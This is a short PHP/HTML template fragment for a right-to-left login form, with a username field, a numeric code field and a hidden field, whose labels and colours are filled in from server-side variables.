
 <div class="container">
 <div class="row">

 <form id="form" action="../login.html" method="post">
	   <div class="addpost col s12 m12" style="    left: 0;
    position: absolute;
    top: 74px;
    right: 0;
    margin: auto;
        max-width: 485px;    direction: rtl;">
        <div class="col s12 center bold" style="<?=$st['color']?>" >
        <i class="fa fa-<?=$icon?> fa-5x RA" style="<?=$st['color']?>" aria-hidden="true"></i>
        </div>
	   <div class="addpost col s12 m12   " id="addpost">
          <div class="card no-shadow">
            <div class="card-content" style="padding: 10px;" >
 <div class="row">
 <div class="col s12 center bold" style="<?=$st['color']?>" >
      <div class="center lg title" style="<?=$st['color']?>" ><?=$st['title']?></div>
 </div>
 <div class="input-field col s12 ">
     <input type="text"  name="user" dir="ltr" class="form-control center " value="<?=Sion("user")?>" id="email" required>
          <label for="first_name" ><?=$st['name']?></label>
        </div>

        <div class="input-field col s12 ">
     <input type="number"  name="number" dir="ltr" class="form-control center " value="" id="email" required>
     <input type="hidden" name="RA" />
          <label for="first_pass"  class="pass active" ><?=$st['pass']?></label>
        </div>
    </div>
    </div>
            <div class="card-action">
  <div class="col s12 m12 center" dir="rtl">
  <button name="post" class=' btn waves-effect waves-light <?=$st['login']?> '   value="login" href='#' type="submit"><span class="Lbtn" ><?=$st['btn']?></span>    <i class="fa fa-sign-in  left"></i>  </button>
        </div>
        <div class="clear" ></div>
    </div>



    </div>
    </div>
    </div>
    </form>
    </div>
    </div>
